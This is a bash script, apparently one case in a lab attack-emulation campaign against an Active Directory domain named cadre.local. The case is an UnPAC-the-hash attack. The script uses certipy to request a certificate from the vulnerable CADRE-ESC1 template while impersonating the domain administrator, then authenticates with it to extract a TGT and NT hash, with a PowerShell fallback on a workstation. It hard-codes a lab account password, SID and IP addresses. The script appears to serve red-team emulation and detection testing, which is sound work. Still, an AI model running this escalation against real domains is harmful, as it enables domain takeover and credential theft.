#!/usr/bin/env bash
# T053 — UnPAC-the-hash. Prefer certipy on the attacker (provisioning).
# ws01 fallback uses only world-readable C:\Tools / Program Files (no other-user profile probe).
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/campaign-a-common.sh"

CASE_ID="CADRE-T053-UNPAC-${CASE_DATE:-$(date -u +%Y%m%d)}"
T0=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "=== T053 UnPAC-the-hash | ${CASE_ID} | T0=${T0} ==="

unpac_ws01() {
  echo "ws01 C:\\Tools UnPAC"
  campaign_vagrant_run_ps1 campaign-a-t053-copy-certipy.ps1
  campaign_stage_run_ps1 chief_command 'C0mm@nd_Ch1ef!' campaign-a-t053-unpac.ps1 cadre.local
}

CERTIPY_BIN=""
for c in certipy certipy-ad; do
  if command -v "$c" >/dev/null 2>&1; then
    CERTIPY_BIN="$c"
    break
  fi
done

KALI_OK=0
if [[ -n "${CERTIPY_BIN}" ]]; then
  echo "Using attacker ${CERTIPY_BIN}"
  WORK="$(mktemp -d)"
  trap 'rm -rf "${WORK}"' EXIT
  set +e
  OUT="$(
    cd "${WORK}" || exit 1
    "${CERTIPY_BIN}" req \
      -u 'chief_command@cadre.local' \
      -p 'C0mm@nd_Ch1ef!' \
      -dc-ip 192.168.77.10 \
      -ca cadre-CA \
      -target dc01.cadre.local \
      -template CADRE-ESC1 \
      -upn administrator@cadre.local \
      -sid 'S-1-5-21-277764030-1371232215-1561074416-500' \
      -out unpac-admin 2>&1
  )"
  REQ_RC=$?
  AUTH=""
  AUTH_RC=1
  PFX=""
  for f in "${WORK}"/*.pfx "${HOME}"/*unpac-admin.pfx; do
    [[ -f "$f" ]] && PFX="$f" && break
  done
  if [[ -n "${PFX}" ]]; then
    AUTH="$("${CERTIPY_BIN}" auth -pfx "${PFX}" -dc-ip 192.168.77.10 -domain cadre.local 2>&1)"
    AUTH_RC=$?
  fi
  set -e
  if [[ "${REQ_RC}" -eq 0 && "${AUTH_RC}" -eq 0 ]] && printf '%s\n' "${AUTH}" | grep -qiE 'Hash NTLM|Got TGT|NT hash'; then
    printf '%s\n' "${OUT}"
    printf '%s\n' "${AUTH}"
    echo "T_UNPAC_OK"
    KALI_OK=1
  else
    echo "T_UNPAC_INFO: kali certipy req_rc=${REQ_RC} auth_rc=${AUTH_RC} — trying ws01 (raw kali text omitted so fail-patterns do not veto)"
  fi
else
  echo "certipy not on attacker PATH — ws01 C:\\Tools fallback"
fi

if [[ "${KALI_OK}" -ne 1 ]]; then
  unpac_ws01
fi

cadre_export "${CASE_ID}" T053 "${T0}" 192.168.77.62
echo "T0=${T0}" | tee "/tmp/${CASE_ID}.t0"
echo "=== T053 run complete ==="
